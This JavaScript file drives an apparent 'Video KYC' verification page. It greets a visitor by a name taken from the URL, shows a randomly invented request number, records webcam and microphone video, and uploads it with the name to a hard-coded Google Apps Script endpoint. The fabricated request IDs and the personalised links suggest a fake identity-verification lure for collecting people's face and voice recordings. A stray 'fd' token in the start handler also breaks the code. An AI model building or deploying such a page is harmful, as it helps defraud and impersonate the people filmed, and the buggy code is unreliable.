/* ---------------------------
  Configuration - replace this
---------------------------- */
const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz7IoXYmXJuWo1s03bP45N9HsWdev-WNhfghk-epiKWqCfseyZwUb6qtv2QFc70JI-bWA/exec";

/* ---------------------------
  Helper: get name from URL
---------------------------- */
function getNameFromURL() {
  const params = new URLSearchParams(window.location.search);
  return params.get("name") || "";
}

/* ---------------------------
  Generate request id like ALCREQ711
---------------------------- */
function generateRequestID() {
  return "ALCREQ" + Math.floor(100 + Math.random() * 900);
}

/* ---------------------------
  DOM refs
---------------------------- */
const elRequest = document.getElementById("requestNumber");
const elName = document.getElementById("customerName");
const elStart = document.getElementById("startKYC");
const elStop = document.getElementById("stopBtn");
const elUpload = document.getElementById("uploadBtn");
const elPreview = document.getElementById("preview");
const elRecorded = document.getElementById("recorded");
const elStatus = document.getElementById("status");

let mediaRecorder = null;
let recordedChunks = [];
let finalBlob = null;

/* ---------------------------
  Init: show name and request id
---------------------------- */
(function initUser() {
  const name = getNameFromURL();
  if (name) {
    elName.textContent =` Dear ${name},`;
  } else {
    elName.textContent = `Dear Customer,`;
  }
  elRequest.textContent = `Video KYC Process for Request No: ${generateRequestID()}`;
})();

/* ---------------------------
  Start recording
---------------------------- */
elStart.addEventListener("click", async () => {
  // clear previous
  recordedChunks = [];   
  finalBlob = null;
  elRecorded.style.display = "none";
  elUpload.style.display = "none";     fd
  elStatus.textContent = "";

  try {
    // get stream (browser will ask permission)
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

    // show live preview
    elPreview.srcObject = stream;
    elPreview.style.display = "block";

    // UI
    elStart.style.display = "none";
    elStop.style.display = "inline-block";
    elStatus.textContent = "Recording...";

    // create recorder
    mediaRecorder = new MediaRecorder(stream);

    mediaRecorder.ondataavailable = (ev) => {
      if (ev.data && ev.data.size > 0) recordedChunks.push(ev.data);
    };

    mediaRecorder.onstop = () => {
      finalBlob = new Blob(recordedChunks, { type: "video/webm" });
      elRecorded.src = URL.createObjectURL(finalBlob);
      elRecorded.style.display = "block";
      elUpload.style.display = "inline-block";
      elStatus.textContent = "Recording stopped — preview below.";
    };

    mediaRecorder.start();
  } catch (err) {
    console.error("getUserMedia error:", err);
    elStatus.textContent = "Camera not accessible. Check permissions (HTTPS required).";
    alert("Camera access failed: " + err);
  }
});

/* ---------------------------
  Stop recording
---------------------------- */
elStop.addEventListener("click", () => {
  if (!mediaRecorder) return;
  mediaRecorder.stop();

  // stop all tracks to turn camera off
  if (elPreview.srcObject) {
    elPreview.srcObject.getTracks().forEach(t => t.stop());
    elPreview.srcObject = null;
  }

  elStop.style.display = "none";
  elStart.style.display = "inline-block";
});

/* ---------------------------
  Upload recorded blob to Google Script
  (Apps Script expects form field name "file")
---------------------------- */
elUpload.addEventListener("click", async () => {
  if (!finalBlob) {
    alert("No video recorded yet.");
    return;
  }

  if (!GOOGLE_SCRIPT_URL || GOOGLE_SCRIPT_URL === "YOUR_GOOGLE_WEB_APP_URL") {
    alert("Please set your Google Script URL in link.js (GOOGLE_SCRIPT_URL).");
    return;
  }

  elStatus.textContent = "Uploading...";
  elUpload.disabled = true;

  try {
    const fd = new FormData();
    fd.append("file",finalBlob,`KYC_${Date.now()}.webm`);
    // append metadata (name + request id)
    const name = getNameFromURL();
    fd.append("name", name || "");
    fd.append("requestId", elRequest.textContent || "");

    const res = await fetch(GOOGLE_SCRIPT_URL, { method: "POST", body: fd });
    const text = await res.text();
    elStatus.textContent = "Upload finished.";
    alert("Upload finished: " + text);
  } catch (err) {
    console.error(err);
    alert("Upload failed: " + err);
    elStatus.textContent = "Upload failed.";
  } finally {
    elUpload.disabled = false;
  }
});
